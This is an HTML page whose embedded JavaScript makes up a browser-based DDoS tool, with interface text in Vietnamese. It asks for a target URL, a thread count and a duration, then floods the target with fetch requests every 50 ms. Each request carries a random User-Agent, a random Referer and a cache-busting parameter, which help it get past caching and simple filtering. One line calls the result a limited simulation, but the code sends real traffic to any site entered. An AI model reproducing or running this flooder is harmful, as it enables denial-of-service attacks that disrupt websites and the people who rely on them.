<!DOCTYPE html>
<html>
<head>
    <title>DDoS Web Tool (Client-Side - MAX Performance)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 80%;
            max-width: 600px;
        }

        h1 {
            color: #333;
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: bold;
        }

        .form-group input[type="text"],
        .form-group input[type="number"],
        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
            font-size: 16px;
        }

        button {
            background-color: #d9534f; /* Đỏ */
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 18px;
            transition: background-color 0.3s ease, transform 0.1s ease; /* Animation nút */
        }

        button:hover {
            background-color: #c9302c; /* Đỏ đậm hơn */
        }

        button:active {
            transform: scale(0.95); /* Hiệu ứng nhấn nút */
        }

        #status {
            margin-top: 20px;
            font-weight: bold;
            animation: pulseStatus 1.5s infinite; /* Animation trạng thái */
            min-height: 2em; /* Đảm bảo đủ không gian cho thông báo */
        }

        @keyframes pulseStatus {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }

        .attacking-container {
            background-color: #ffe0b2; /* Màu cam nhạt khi tấn công */
        }

        #progressBarContainer {
            width: 100%;
            background-color: #eee;
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden; /* Để bo tròn góc thanh tiến trình */
        }

        #progressBar {
            width: 0%;
            height: 20px;
            background-color: #4CAF50; /* Màu xanh lá cây */
            border-radius: 4px;
            transition: width 0.1s ease; /* Animation mượt mà cho thanh tiến trình */
        }

        #requestsSent {
            margin-top: 10px;
            font-style: italic;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <h1>DDoS Web Tool (Client-Side - MAX Performance)</h1>
        <div class="form-group">
            <label for="targetUrl">URL mục tiêu:</label>
            <input type="text" id="targetUrl" placeholder="Nhập URL mục tiêu (ví dụ: http://example.com)">
        </div>
        <div class="form-group">
            <label for="attackMethod">Phương thức tấn công:</label>
            <select id="attackMethod">
                <option value="http-flood">HTTP Flood (Client-Side - MAX)</option>
                <option value="none">Không khả dụng (Slowloris, UDP Flood - Client-Side)</option>
            </select>
        </div>
        <div class="form-group">
            <label for="threads">Số luồng (threads - đồng thời):</label>
            <input type="number" id="threads" value="100" min="1"> <!-- Tăng threads mặc định -->
        </div>
        <div class="form-group">
            <label for="duration">Thời gian tấn công (giây):</label>
            <input type="number" id="duration" value="20" min="1"> <!-- Tăng duration mặc định -->
        </div>
        <button id="startAttack">🔥 BẮT ĐẦU TẤN CÔNG TỐI ĐA! 🔥</button>
        <div id="status">Sẵn sàng cho cuộc tấn công tối đa...</div>
        <div id="progressBarContainer">
            <div id="progressBar"></div>
        </div>
        <div id="requestsSent"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const startAttackButton = document.getElementById('startAttack');
            const statusDiv = document.getElementById('status');
            const mainContainer = document.getElementById('mainContainer');
            const progressBar = document.getElementById('progressBar');
            const requestsSentDiv = document.getElementById('requestsSent');

            startAttackButton.addEventListener('click', function() {
                const targetUrl = document.getElementById('targetUrl').value;
                const attackMethod = document.getElementById('attackMethod').value;
                const threads = parseInt(document.getElementById('threads').value);
                const duration = parseInt(document.getElementById('duration').value);

                if (!targetUrl) {
                    statusDiv.textContent = 'LỖI: Vui lòng nhập URL mục tiêu!';
                    statusDiv.style.color = 'red';
                    return;
                }

                if (attackMethod === 'none') {
                    statusDiv.textContent = 'LỖI: Phương thức này không khả dụng ở phía client!';
                    statusDiv.style.color = 'red';
                    return;
                }

                statusDiv.textContent = '🔥 ĐANG KHỞI ĐỘNG CUỘC TẤN CÔNG HTTP FLOOD TỐI ĐA (Client-Side)... 🔥';
                statusDiv.style.color = 'orange';
                mainContainer.classList.add('attacking-container');
                progressBar.style.width = '0%'; // Reset progress bar
                requestsSentDiv.textContent = '';
                let sentRequestsCounter = 0;

                const startTime = Date.now();
                let attackInterval;
                const userAgents = [ // Danh sách User-Agent ngẫu nhiên
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/96.0.1054.62",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
                    // ... Bạn có thể thêm nhiều User-Agent hơn
                ];
                const referers = [ // Danh sách Referer ngẫu nhiên
                    "https://www.google.com/",
                    "https://www.facebook.com/",
                    "https://www.youtube.com/",
                    "https://twitter.com/",
                    "https://www.example.com/"
                    // ... Bạn có thể thêm nhiều Referer hơn
                ];

                const sendHttpRequest = () => {
                    if (Date.now() - startTime >= duration * 1000) {
                        clearInterval(attackInterval);
                        statusDiv.textContent = `🔥 CUỘC TẤN CÔNG TỐI ĐA HOÀN TẤT (Client-Side)! 🔥 Đã gửi TỔNG CỘNG ${sentRequestsCounter} requests. (Lưu ý: Vẫn là mô phỏng, hiệu quả RẤT HẠN CHẾ)`;
                        statusDiv.style.color = 'green';
                        mainContainer.classList.remove('attacking-container');
                        return;
                    }

                    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
                    const randomReferer = referers[Math.floor(Math.random() * referers.length)];
                    const cacheBuster = `?rand=${Math.random()}`; // Cache busting
                    const requestUrl = targetUrl + cacheBuster;

                    fetch(requestUrl, {
                        mode: 'no-cors',
                        keepalive: true, // Thử nghiệm keepalive
                        headers: {
                            'User-Agent': randomUserAgent,
                            'Referer': randomReferer
                        }
                    })
                    .then(response => {
                        sentRequestsCounter++;
                        requestsSentDiv.textContent = `Requests đã gửi: ${sentRequestsCounter}`;
                        // console.log(`Client-Side HTTP Flood: Request sent, status: ${response.status}`); // Tắt log để giảm tải trình duyệt
                    })
                    .catch(error => {
                        console.error('Client-Side HTTP Flood Error:', error);
                    });
                };

                const totalRequests = threads * (duration * 1000 / 50); // Ước tính tổng số request (có thể không chính xác)
                let requestsSentInInterval = 0; // Đếm request trong mỗi interval để cập nhật progress bar

                attackInterval = setInterval(() => {
                    const promises = []; // Mảng chứa các Promise cho fetch
                    for (let i = 0; i < threads; i++) {
                        promises.push(sendHttpRequest()); // Thêm Promise vào mảng
                    }
                    Promise.all(promises).then(() => { // Chờ tất cả các request trong interval hoàn thành (không thực sự cần thiết cho DDoS, nhưng có thể hữu ích cho việc đếm)
                        requestsSentInInterval += threads; // Cập nhật số request đã gửi trong interval
                        const progress = (Date.now() - startTime) / (duration * 1000) * 100; // Tính phần trăm tiến trình
                        progressBar.style.width = `${progress}%`; // Cập nhật thanh tiến trình
                        if (progress > 100) progressBar.style.width = '100%'; // Đảm bảo không vượt quá 100%
                    });

                }, 50); // Interval gửi request (giảm xuống để tăng tốc độ, thử nghiệm cẩn thận)

            });
        });
    </script>
</body>
</html>